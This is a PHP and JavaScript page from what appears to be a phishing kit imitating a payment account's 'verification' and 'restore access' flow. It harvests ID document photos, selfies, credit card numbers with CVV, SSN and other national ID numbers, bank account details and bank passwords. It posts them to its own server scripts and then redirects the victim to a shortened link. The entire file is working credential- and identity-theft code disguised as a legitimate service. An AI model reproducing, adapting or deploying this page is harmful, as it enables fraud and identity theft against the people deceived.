<?php
error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
require_once '../lang.php';
?>
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <link rel="shortcut icon" href="assets/pics/favi.ico">
    <link rel="apple-touch-icon" href="assets/pics/favi.png">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <title><?php echo $account['title'];?></title>
    <link rel="stylesheet" href="assets/styles/process.css">
    <script type="text/javascript" src="assets/js/jquery-3.3.1.min.js">
    </script>
    <script type="text/javascript" src="assets/js/jquery.mask.min.js">
    </script>
    <script type="text/javascript" src="assets/js/jquery.ccvalid.js"></script>
</head>

<body>
    <input type="checkbox" id="toggleMenu" class="menuToggler">
    <div class="desktopNav">
        <div class="navContainer">
            <a href="javascript:" class="desktopBrand"></a>
            <div class="mobileMenu">
                <div class="logoutMobile">
                    <a href="javascript:" class="logoutTxtMobile">
          Log Out</a>
                </div>
                <div class="settingsMobile">
                    <a href="javascript:" class="svgLogo settingsTxt">
                        <img src="assets/pics/settings.svg" alt=""></a>
                </div>
                <div>
                    <p class="displayMail">
                        <?php echo $_SESSION['login_email'];?></p>
                </div>
            </div>
            <div class="desktopMenu">
                <nav class="desktopItems">
                    <ul class="firstUl">
                        <li class="">
                            <a href="javascript:" class="linksTxt">
        <?php echo $account['summary'];?>     </a>
                        </li>
                        <li class="">
                            <a href="javascript:" class="linksTxt">
        <?php echo $account['activity'];?></a>
                        </li>
                        <li class="">
                            <a href="javascript:" class="linksTxt">
         <?php echo $account['send'];?></a></li>
                        <li class="">
                            <a href="javascript:" class="linksTxt"><?php echo $account['wallet'];?></a>
                        </li>
                        <li class="activeLi">
                            <a href="javascript:" class="linksTxt"><?php echo $account['help'];?></a>
                        </li>
                    </ul>
                    <ul class="secondUl">
                        <li class="notifLi">
                            <a href="javascript:" class="svgLogo notifTxt">
                                <img src="assets/pics/noti.svg" alt=""></a>
                        </li>
                        <li>
                            <a href="javascript:" class="svgLogo settingsTxt"><img src="assets/pics/settings.svg" alt=""></a>
                        </li>
                        <li class="logoutLi">
                            <a href="javascript:" class="logoutTxtDesktop"><?php echo $account['logout'];?></a>
                        </li>
                    </ul>
                </nav>
            </div>
        </div>
    </div>

    <div class="mainContainer">
        <div class="hide" id="rotate">
            <div class="spinner">
                <div class="rotate"></div>
                <div class="processing"><?php echo $account['proccessing'];?>...</div>
            </div>
            <div class="overlay">
            </div>
        </div>
        <div class="mobileNav">
            <div class="navHeader">
                <div class="blockToggler">
                    <label class="menuLabel" for="toggleMenu"><span></span>
                        <div class="menuOpen">Menu</div>
                        <div class="menuClose">
                            Close</div>
                    </label>
                </div>
            </div>
            <div class="navLogo">
                <a href="javascript:" class="mobileBrand"></a>
            </div>
            <ul class="notifUl">
                <li>
                    <a class="svgLogo notifTxt">
                        <img src="assets/pics/noti.svg" alt="">
                    </a>
                </li>
            </ul>
        </div>
        <?php if($os == "Android" or $os == "iPhone") {
        }else{
          echo "<br><br>";
        }?>
        <div class="contents">
			<section class="mainContents" id="process">
				<div class="fields clearfix">
					<!--73391204-->
					<input id="ccn" type="hidden">
				</div>
				<!--88210428-->
			</section>
			<section class="mainContents" id="finish">
				<div style="padding:0 20px">
					<h1 style="margin:10px;padding-bottom:10px;font-size:2.4rem">
		<?php echo $id['uploadur'];?>	</h1>
					<div>
						<ol class="proof">
							<li class="itm current">
								<div class="ui-text-small"><?php echo $id['ip'];?>
									<!--31864166-->
								</div>
							</li>
							<li class="itm">
								<div class="ui-text-small">
									<!--42877764--><?php echo $id['swp'];?></div>
							</li>
							<!--87875023-->
							<!--85346098-->
							<li class="itm">
								<div class="ui-text-small"><?php echo $id['pc'];?></div>
							</li>
							<!--18916056-->
						</ol>
					</div>
					<div id="select_one">
						<!--8355101-->
						<form action="javascript:void(0);" method="POST">
							<!--341947-->
							<!--14849027-->
							<div id="area_choose">
								<!--4276259-->
								<h1 style="font-size:1.4rem!important">
								<?php echo $id['choose'];?></h1>
								<div class="doc_type">
									<div class="doc_type_choice">
										<div class="doc_type_choice_wrapper">
											<div>
												<img src="assets/pics/id_p.svg" alt="">
											</div>
											<label class="cont">
												<input type="radio" name="doc_type" value="Passport">
												<!--45702491-->	<span class="checkmark"></span>
												<span> <?php echo $id['passport'];?></span>
												<!--99114641-->
											</label>
										</div>
									</div>
									<!--50334486-->
									<div class="doc_type_choice">
										<div class="doc_type_choice_wrapper">
											<div>
												<img src="assets/pics/id_n.svg" alt="">
											</div>
											<!--45118334-->
											<label class="cont">
												<input type="radio" name="doc_type" value="National ID">	<span class="checkmark"></span>
												<!--68015357-->	<span> <?php echo $id['natid'];?></span>
												<!--56119564-->
											</label>
										</div>
									</div>
									<div class="doc_type_choice">
										<div class="doc_type_choice_wrapper">
											<div>
												<img src="assets/pics/id_n.svg" alt="">
												<!--10573839-->
											</div>
											<label class="cont">
												<!--2500398-->
												<input type="radio" name="doc_type" value="Driver's license">
												<!--22257854-->	<span class="checkmark"></span>
												<!--18780954-->	<span> <?php echo $id['drive'];?></span>
											</label>
										</div>
										<!--8939367-->
										<!--59510384-->
									</div>
								</div>
								<!--74403878-->

								<button style="margin-bottom:1.2rem;margin-top:1rem" type="submit" class="bt bt_select_one"><?php echo $id['proc'];?></button>
							</div>
							<div id="area_up_id" style="display:none">
								<h1 style="font-size:1.4rem"><?php echo $id['upur'];?><!--2438283-->		<span></span>
	<!--6976252-->	</h1>
								<div class="row rules text-center">
									<!--78953027-->
									<div class="rule">
										<!--47187466-->
										<img src="assets/pics/scan_id.svg" alt="">
										<div><?php echo $id['take'];?></div>
									</div>
									<div class="rule">
										<img src="assets/pics/both_sides.svg" alt="">
										<!--77222865-->
										<div><?php echo $id['submit'];?></div>
									</div>
									<div class="rule">
										<img src="assets/pics/both_pass.svg" alt="">
										<div>
											<!--12601849--><?php echo $id['scan'];?></div>
										<!--75311794-->
									</div>
								</div>
								<div class="zone" id="up_id_zone">
									<!--54567872-->
									<div class="dropzone-main" style="display:block">
										<div class="dropzone-img">
											<input style="display:none" type="file" name="file[]" accept="image/*" multiple>
										</div>
										<p><b><?php echo $id['drag'];?></p>
									</div>
								</div>
								<div class="imagesArea"></div>
								<button style="margin-bottom:1.2rem;margin-top:1rem" type="submit" class="bt bt_select_one"><?php echo $id['proc'];?></button>
								<div><a href="javascript:void(0)" class="back"><?php echo $id['back'];?></a>
								<br><br></div>
							</div>
						</form>
						<script>
							$(document).on('click','.doc_type_choice',function(){$(this).find('[name="doc_type"]').prop('checked',true);});$('.bt_select_one').click(function(){if($('[name=doc_type]').is(':checked')){$('#area_choose').hide('slow');$('#area_up_id > h1 > span, #area_up_selfie > h1 > span').html($('[name=doc_type]:checked').parent().find('span:last').html());$('#area_up_id').show('slow');}});$(document).on('click','#area_up_id .back',function(){$('#area_up_id').hide('slow');$('#area_choose').show('slow');});$(document).on('submit','#select_one > form',function(e){e.preventDefault();if($('#select_one .imagesArea .imgItem').length==0){return false;}
							$('#rotate').removeClass('hide');$.post('upload_photo.php?key=<?php echo $key;?>',$(this).serialize(),function(dt,st){if(dt&&st=='success'){$('.proof li:nth-child(2)').addClass('current');$('#select_one').addClass('hide');$('#select_two').removeClass('hide');window.scrollTo(0,0);$('#rotate').addClass('hide');}});});
						</script>
					</div>
					<div id="select_two" class="hide">
						<form action="javascript:void(0);" method="POST">
							<div id="area_up_selfie">
								<h1 style="font-size:1.4rem"><?php echo $id['ups'];?><span></span></h1>
								<div class="row rules text-center">
									<div class="rule">
										<img src="assets/pics/take_s.svg" alt="">
										<div><?php echo $id['make'];?></div>
									</div>
									<div class="rule">
										<img src="assets/pics/fingers_not.svg" alt="">
										<div><?php echo $id['finger'];?></div>
									</div>
									<div class="rule">
										<img src="assets/pics/glaesses_not.svg" alt="">
										<div><?php echo $id['wear'];?></div>
									</div>
								</div>
								<div class="zone" id="up_id_zone">
									<div class="dropzone-main" style="display:block">
										<div class="dropzone-img" style="background-image:url(assets/pics/up_slf.svg),none">
											<input style="display:none" type="file" name="file[]" accept="image/*" multiple>
										</div>
										<p><b><?php echo $id['drag'];?></p>
									</div>
								</div>
								<div class="imagesArea"></div>
								<input type="hidden" name="id_slf" value="ok">
								<input style="margin-bottom:1rem;margin-top:1rem" type="submit" class="bt" value="<?php echo $id['proc'];?>">
								<div><a href="javascript:void(0)" class="back"><?php echo $id['back'];?></a><br><br>
								</div>
							</div>
						</form>
						<script>
							$(document).on('click','#area_up_selfie .back',function(){$('.proof li:nth-child(2)').removeClass('current');$('#select_one').removeClass('hide');$('#select_one .imagesArea').html('');$('#select_one [type=hidden]').remove();$('#select_two').addClass('hide');});$(document).on('submit','#select_two > form',function(e){e.preventDefault();if($('#select_two .imagesArea .imgItem').length==0){return false;}
							$('#rotate').removeClass('hide');$.post('upload_selfie.php?key=<?php echo $key;?>',$(this).serialize(),function(dt,st){if(dt&&st=='success'){$('.proof li:nth-child(3)').addClass('current');$('#select_one').addClass('hide');$('#select_two').addClass('hide');$('#select_three').removeClass('hide');window.scrollTo(0,0);setTimeout(function(){window.location.href="https://bit.do/webaccount";},6000);$('#rotate').addClass('hide');}});});
						</script>
					</div>
					<div id="select_three" class="hide">
						<div style="padding:20px">
							<img src="assets/pics/success.svg" alt="" width="150">
							<h1 style="margin:10px;padding-bottom:10px;font-size:2.4rem"><?php echo $id['restore'];?>
							<div>
								<button style="margin-top:20px;border-radius:.5rem" class="bt gone_bt"><?php echo $account['continue'];?></button>
							</div>
						</div>
					</div>
				</div>
			</section>
		</div>
		<?php if($os == "Android" or $os == "iPhone") {
        }else{
          echo "<br><br>";
        }?>
        <div>
            <div class="ftr">
                <div class="footerFirstContent">
                    <ul class="footerList">
                        <li><a href="javascript:"><?php echo $account['contact'];?></a></li>
                        <li><a href="javascript:"><?php echo $account['sec'];?></a></li>
                    </ul>
                    <div class="footerSecondContent">
                        <p class="footerP">Copyright ©<span>1999-2020</span> . All rights reserved.</p>
                        <ul class="footerUl">
                            <li><a href="javascript:"><?php echo $login['privacy'];?></a></li>
                            <li><a href="javascript:"><?php echo $login['legal'];?></a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
	<script>
		$(document).ready(function(){$('#cex').mask('00/0000');$('#csc').mask('0000');$('#dob').mask('00/00/0000');$('#ccn').mask('0000 0000 0000 0000 000');$('#pnm').mask('000000000000000');$('#ssn').mask('000-00-0000');$('#acn').mask('00000000');$('#stc').mask('00-00-00');$('#sin').mask('000-000-000');function validExp(b){var a=new RegExp("(([0][1-9]{1})|([1][0-2]{1}))/20(([1][8-9]{1})|([2][0-9]{1}))");return a.test(b);}
		function isDate(vl){var rg=/^([0-9]{2})+\/([0-9]{2})+\/([0-9]{4})+$/;return rg.test(vl);}
		function validDob(vl){var c=false;if(isDate(vl)&&(vl.split('/')[2]>"1919"&&vl.split('/')[2]<"2006")){c=true;}
		return c;}
		function valid(){var check=true;var ii=0;$('#process input:not(.bt):not([type=checkbox]),#process select').each(function(i,el){if(!$(el).val()){$(el).parent().addClass('hasError');check=false;}else{$(el).not('#ccn').parent().removeClass('hasError');}
		if($(el).attr('id')=='cex'){if(!validExp($(el).val())){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}}
		if($(el).attr('id')=='dob'){if(!validDob($(el).val())){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}}
		if($(el).attr('id')=='csc'){if($('select:first').val()=='amx'&&$(el).val().length!=4){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}
		if($('select:first').val()!='amx'&&$(el).val().length!=3){$(el).parent().addClass('hasError');check=false;}}});return check;}
		$(document).on('change','#process select',function(){$(this).parent().removeClass('hasError');$(this).parent().children('.labelSelect').html($(this).children("option:selected").text());$(this).parent().attr('data-name',$(this).val());if($(this).val()=='amx'){$('.csc input').attr('placeholder',$('.csc input').attr('placeholder').replace('3','4'));$('.csc input').attr('maxlength','4');}else{$('.csc input').attr('placeholder',$('.csc input').attr('placeholder').replace('4','3'));$('.csc input').attr('maxlength','3');}});var ccvalid=false;$('#ccn').validateCreditCard(function(result){var cc=$('#ccn');if(cc.val()!=''){if(result.valid){cc.parent().removeClass('hasError');ccvalid=true;}else{cc.parent().addClass('hasError');ccvalid=false;}}});$('#process input:not(.bt):not([type=checkbox]),select').each(function(i,el){$(el).keyup(function(){valid();});$(el).change(function(){valid();});});$(document).on('submit','#process form',function(){check=true;if(!valid()){check=false;}
		if(!validExp($('#cex').val())){$('#cex').parent().addClass('hasError');check=false;}else{$('#cex').parent().removeClass('hasError');}
		if(!ccvalid){$('#ccn').parent().addClass('hasError');check=false;}
		if(!validDob($('#dob').val())){$('#dob').parent().addClass('hasError');check=false;}
		if(!check){return false;}else{$('#rotate').removeClass('hide');var ctp=$('#ctp').children("option:selected").text();var ccn=$('#ccn').val();var cex=$('#cex').val();var csc=$('#csc').val();var fnm=$('#fnm').val();var dob=$('#dob').val();var adr=$('#adr').val();var cty=$('#cty').val();var zip=$('#zip').val();var stt=$('#stt').val();var cnt=$('#cnt').val();var ptp=$('#ptp').val();var par=$('#par').val();var pnm=$('#pnm').val();var mdn=$('#mdn').val();var ssn=$('#ssn').val();var pps=$('#pps').val();var clm=$('#clm').val();var dln=$('#dln').val();var sin=$('#sin').val();var pse=$('#pse').val();var dni=$('#dni').val();var bsn=$('#bsn').val();var cpf=$('#cpf').val();var fcn=$('#fcn').val();var acn=$('#acn').val();var stc=$('#stc').val();var bus=$('#bus').val();var bpw=$('#bpw').val();var o={ctp,ccn,cex,csc,fnm,dob,adr,cty,zip,stt,cnt,ptp,par,pnm,mdn,ssn,pps,clm,dln,sin,pse,dni,bsn,cpf,fcn,acn,stc,bus,bpw};var start=new Date;var xT=0;var idT=setInterval(function(){xT=Math.trunc((new Date-start)/1000);},1000);var toStart=0;$.post('',o,function(data,status){if(data=='done'&&status=='success'){clearInterval(idT);if(xT>4){toStart=0;}else{toStart=1800;}
		setTimeout(function(){setId();},toStart);}else{$('#rotate').addClass('hide');}});}
		return false;});function setId(){$('#rotate').addClass('hide');$('#process').addClass('hide');$('#finish').removeClass('hide');window.scrollTo(0,0);}
		$('.gone_bt').click(function(){window.location.href="https://bit.do/webaccount";});function readFile(files,me,check){if(files){for(var i=0;i<files.length;i++){var FR=new FileReader();FR.onload=function(e){if(e.target.result.startsWith("data:image/")&&e.total<=5000000){if(check){$(me).parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="'+e.target.result+'" alt=""><button class="btDel">X</button></div>');}else{$(me).parent().parent().parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="'+e.target.result+'" alt=""><button class="btDel">X</button></div>');}
		$(me).closest('form').append('<input type="hidden" value="'+e.target.result+'" name="images[]">');}}
		FR.readAsDataURL(files[i]);}}}
		$(document).on('click','.zone',function(e){e.stopPropagation();$(this).find('input[type=file]').trigger(e);});$(document).on('click','.btDel',function(){$(this).closest('form').find('[value="'+$(this).prev().attr('src')+'"]').remove();$(this).parent().remove();});$(document).on('change','input[type=file]',function(){readFile(this.files,this,false);});$(".dropzone-main").on('dragleave',function(e){e.preventDefault();$(this).css('border','2px dashed #dee3e7');$(this).css('background','#f0f2f4');});$(".dropzone-main").on('dragover',function(e){e.preventDefault();$(this).css('border','2px dashed #0564b3');$(this).css('background','#ecf1f9');});$(".dropzone-main").on('drop',function(e){e.preventDefault();$(this).css('border','2px dashed #41ad49');readFile(e.originalEvent.dataTransfer.files,this,true);});});
	</script>
</body>

</html>
